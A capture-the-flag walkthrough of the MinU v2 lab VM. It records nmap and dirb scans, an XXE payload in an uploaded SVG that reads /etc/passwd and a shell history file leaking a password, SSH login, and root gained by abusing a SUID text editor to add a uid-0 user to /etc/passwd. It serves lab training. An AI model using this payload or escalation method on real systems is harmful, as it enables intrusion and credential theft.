Initial Nmap scanning is used for port scanning and service detection.

#Scanning

┌─[root@parrot]─[/home/user]
└──╼ #NMAP -SV -A 10.0.2.18

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-31 16:57 UTC
Nmap scan report for 10.0.2.18
Host is up (0.00074s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 82:33:25:61:27:97:ea:4a:49:f5:76:a3:33:1c:ae:2b (RSA)
|   256 ed:ca:f6:b9:b5:39:32:89:d0:a3:36:94:82:04:4a:e8 (ECDSA)
|_  256 26:79:15:2e:be:93:02:41:04:c9:ea:e8:05:16:d1:83 (ED25519)
3306/tcp open  mysql?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Transfer-Encoding: chunked
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     X-Powered-By: Kemal
|     Content-Type: text/html
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <style type="text/css">
|     body { text-align:center;font-family:helvetica,arial;font-size:22px;
|     color:#888;margin:20px}
|     max-width: 579px; width: 100%; }
|     {margin:0 auto;width:500px;text-align:left}
|     </style>
|     </head>
|     <body>
|     <h2>Kemal doesn't know this way.</h2>
|_    <svg id="svg" version="1.1" width="400" height="400" viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ><g id="svgg"><path id="path0" d="M262.800 99.200 L 262.800 150.400 265.461 150.400 L 268.121 150.400 267.864 144.300 C 267.722 140.945,267.510 120.110,267.391 98.000 C 267.273 75.890,267.074 55.595,266.948 52.900 L 266.719 48.000 264.760 48.000 L 262.800 48.000 262.800 99.200 M160.800 290.800 C 160.800 291.301,161.224 291.301,162.000
|_mysql-info: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.70%I=7%D=7/31%Time=5D41C874%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,6D,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain\r\nTransfer-Encoding:\x20chunked\r\n\r\n10\r\n400\x20Bad\x20R
SF:equest\n\r\n0\r\n\r\n")%r(GetRequest,3330,"HTTP/1\.0\x20404\x20Not\x20F
SF:ound\r\nX-Powered-By:\x20Kemal\r\nContent-Type:\x20text/html\r\n\r\n\x2
SF:0\x20<!DOCTYPE\x20html>\n\x20\x20<html>\n\x20\x20<head>\n\x20\x20\x20\x
SF:20<style\x20type=\"text/css\">\n\x20\x20\x20\x20body\x20{\x20text-align
SF::center;font-family:helvetica,arial;font-size:22px;\n\x20\x20\x20\x20\x
SF:20\x20color:#888;margin:20px}\n\x20\x20\x20\x20img\x20{\x20max-width:\x
SF:20579px;\x20width:\x20100%;\x20}\n\x20\x20\x20\x20#c\x20{margin:0\x20au
SF:to;width:500px;text-align:left}\n\x20\x20\x20\x20</style>\n\x20\x20</he
SF:ad>\n\x20\x20<body>\n\x20\x20\x20\x20<h2>Kemal\x20doesn't\x20know\x20th
SF:is\x20way\.</h2>\n\x20\x20\x20\x20<svg\x20id=\"svg\"\x20version=\"1\.1\
SF:"\x20width=\"400\"\x20height=\"400\"\x20viewBox=\"0\x200\x20400\x20400\
SF:"\x20xmlns=\"http://www\.w3\.org/2000/svg\"\x20xmlns:xlink=\"http://www
SF:\.w3\.org/1999/xlink\"\x20><g\x20id=\"svgg\"><path\x20id=\"path0\"\x20d
SF:=\"M262\.800\x2099\.200\x20L\x20262\.800\x20150\.400\x20265\.461\x20150
SF:\.400\x20L\x20268\.121\x20150\.400\x20267\.864\x20144\.300\x20C\x20267\
SF:.722\x20140\.945,267\.510\x20120\.110,267\.391\x2098\.000\x20C\x20267\.
SF:273\x2075\.890,267\.074\x2055\.595,266\.948\x2052\.900\x20L\x20266\.719
SF:\x2048\.000\x20264\.760\x2048\.000\x20L\x20262\.800\x2048\.000\x20262\.
SF:800\x2099\.200\x20M160\.800\x20290\.800\x20C\x20160\.800\x20291\.301,16
SF:1\.224\x20291\.301,162\.000")%r(HTTPOptions,3330,"HTTP/1\.0\x20404\x20N
SF:ot\x20Found\r\nX-Powered-By:\x20Kemal\r\nContent-Type:\x20text/html\r\n
SF:\r\n\x20\x20<!DOCTYPE\x20html>\n\x20\x20<html>\n\x20\x20<head>\n\x20\x2
SF:0\x20\x20<style\x20type=\"text/css\">\n\x20\x20\x20\x20body\x20{\x20tex
SF:t-align:center;font-family:helvetica,arial;font-size:22px;\n\x20\x20\x2
SF:0\x20\x20\x20color:#888;margin:20px}\n\x20\x20\x20\x20img\x20{\x20max-w
SF:idth:\x20579px;\x20width:\x20100%;\x20}\n\x20\x20\x20\x20#c\x20{margin:
SF:0\x20auto;width:500px;text-align:left}\n\x20\x20\x20\x20</style>\n\x20\
SF:x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h2>Kemal\x20doesn't\x20kno
SF:w\x20this\x20way\.</h2>\n\x20\x20\x20\x20<svg\x20id=\"svg\"\x20version=
SF:\"1\.1\"\x20width=\"400\"\x20height=\"400\"\x20viewBox=\"0\x200\x20400\
SF:x20400\"\x20xmlns=\"http://www\.w3\.org/2000/svg\"\x20xmlns:xlink=\"htt
SF:p://www\.w3\.org/1999/xlink\"\x20><g\x20id=\"svgg\"><path\x20id=\"path0
SF:\"\x20d=\"M262\.800\x2099\.200\x20L\x20262\.800\x20150\.400\x20265\.461
SF:\x20150\.400\x20L\x20268\.121\x20150\.400\x20267\.864\x20144\.300\x20C\
SF:x20267\.722\x20140\.945,267\.510\x20120\.110,267\.391\x2098\.000\x20C\x
SF:20267\.273\x2075\.890,267\.074\x2055\.595,266\.948\x2052\.900\x20L\x202
SF:66\.719\x2048\.000\x20264\.760\x2048\.000\x20L\x20262\.800\x2048\.000\x
SF:20262\.800\x2099\.200\x20M160\.800\x20290\.800\x20C\x20160\.800\x20291\
SF:.301,161\.224\x20291\.301,162\.000");
MAC Address: 08:00:27:14:99:37 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms 10.0.2.18

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.70 seconds

##Services running
>>> port 22   open  -  ssh
>>> port 3306 open  -  mysql
 


# Dirb scanning

[root@parrot]─[/home/user]
└──╼ #DIRB HTTP://10.0.2.18:3306 -X .HTML

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jul 31 17:00:29 2019
URL_BASE: http://10.0.2.18:3306/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.html) | (.html) [NUM = 1]

-----------------

                                                                              GENERATED WORDS: 4612

---- Scanning URL: http://10.0.2.18:3306/ ----
                                                                              + http://10.0.2.18:3306/upload.html (CODE:200|SIZE:908)                      
                                                                               
-----------------
END_TIME: Wed Jul 31 17:00:39 2019
DOWNLOADED: 4612 - FOUND: 1


##Exploitation

##In dirb scanning founded a directory after ,I opened that directory, I found out that we can upload a .svg (scalable vector graphics) extension file only.

##After some research, I found a script which can used for exploiting,
As I was able to find out it is vulnerable to XXE External entity injection.

##The script that I injected is mentioned below:

#xxe script

<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>

##The name of the vulnerability is: XML External Entity (XXE) Injection in Apache Batik Library [CVE-2015-0250]


##After uploading the script I found out there are more than one user.
##The output after uploading the script.

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE ernw [
<!ENTITY xxe SYSTEM "file:///home/employee/.ash_history">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500px" height="40px" version="1.1">useradd -D bossdonttrackme -p superultrapass3


exit
</svg>


# I found that one of the user name is employee and now got the password as well as highlighted above.
#As ssh service is also running ,I was able to login in using that.

#SSH Login
─[root@parrot]─[/home/user]
└──╼ #ssh employee@10.0.2.18 -p 22
The authenticity of host '10.0.2.18 (10.0.2.18)' can't be established.
ECDSA key fingerprint is SHA256:yDEwMAaye9gQ8q+xTLQxriV2ww9YRUYoGqvsqtXbskI.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.2.18' (ECDSA) to the list of known hosts.
employee@10.0.2.18's password: 
        _                   ____  
  /\/\ (_)_ __  /\ /\__   _|___ \ 
 /    \| | '_ \/ / \ \ \ / / __) |
/ /\/\ \ | | | \ \_/ /\ V / / __/ 
\/    \/_|_| |_|\___/  \_/ |_____|

minuv2:~$ id
uid=1000(employee) gid=1000(employee) groups=1000(employee)
minuv2:~$ pwd
/home/employee
minuv2:~$ ls
image.svg    main-static  main.pl      perl.out     public
minuv2:~$ ls -la
total 14608
drwxr-sr-x    4 employee employee      1024 Jul 31 17:10 .
drwxr-xr-x    3 root     root          1024 Jul 16 17:32 ..
-rw-------    1 employee employee        70 Jul 31 17:23 .ash_history
drwxr-sr-x    3 root     employee      1024 Jul 16 23:33 .config
-rw-r--r--    1 employee employee       253 Jul 31 17:21 image.svg
-rwxr-xr-x    1 employee employee  14949512 Jul 16 17:33 main-static
-rw-r--r--    1 employee employee       169 Jul 16 17:33 main.pl
-rw-r--r--    1 employee employee       302 Jul 31 17:21 perl.out
drwxr-sr-x    2 employee employee      1024 Jul 16 17:33 public
minuv2:~$ sudo -l
-ash: sudo: not found
minuv2:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/micro
/bin/bbsuid

##After checking for SUID permissions ,we found that we can edit the files and certainly can  add or delete users, using the editor Micro

minuv2:~$ /usr/bin/micro

#I used openssl tool for creating the password
minuv2:~$ openssl passwd -1 -salt user3 pass123 
$1$user3$rAGRVf5p2jYTqtqOW5cPu/
minuv2:~$ cat /etc/passwd | /usr/bin/micro
minuv2:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
employee:x:1000:1000:Linux User,,,:/home/employee:/bin/ash
minuv2:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
employee:x:1000:1000:Linux User,,,:/home/employee:/bin/ash
test:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:root:/bin/ash

# I added another user called test with root permissions,So that I can switch to that user and can get root access.

minuv2:~$ su test
Password: 
minuv2:/home/employee# id
uid=0(root) gid=0(root) groups=0(root)
minuv2:/home/employee# ls
image.svg    main-static  main.pl      passwd       perl.out     public
minuv2:/home/employee# id
uid=0(root) gid=0(root) groups=0(root)
minuv2:/home/employee# cd ..
minuv2:/home# ls
employee
minuv2:/home# cd ..
minuv2:/# ls
bin         etc         lost+found  opt         run         swap        usr
boot        home        media       proc        sbin        sys         var
dev         lib         mnt         root        srv         tmp
minuv2:/# cd root
minuv2:~# ls
flag.txt
minuv2:~# cat flag.txt 
        _                   ____  
  /\/\ (_)_ __  /\ /\__   _|___ \ 
 /    \| | '_ \/ / \ \ \ / / __) |
/ /\/\ \ | | | \ \_/ /\ V / / __/ 
\/    \/_|_| |_|\___/  \_/ |_____|

# You got r00t!

 flag{6d696e75326973617765736f6d65}

# I hope you had fun hacking this box, I tried to design this VM to be (a bit) different
# by having newer or not-so-common technologies and a minumal linux install.
#
# Please don't post the content below on Social Networks to let others do the challenge.
#
# As you know by now, the entry point is an XXE vulnerability that can be exploited by
# modifying an image. After that you can enumerate a user and the linux version to know
# that it uses a different file in its home dir.
# To read this you used a suspicious file permission on certain text editor.
# At least that's how it was planned ;)
# Let me know if you got here using another method!
#
# contact@8bitsec.io
# @_8bitsec
# upload at 10.0.2.18:3306/upload

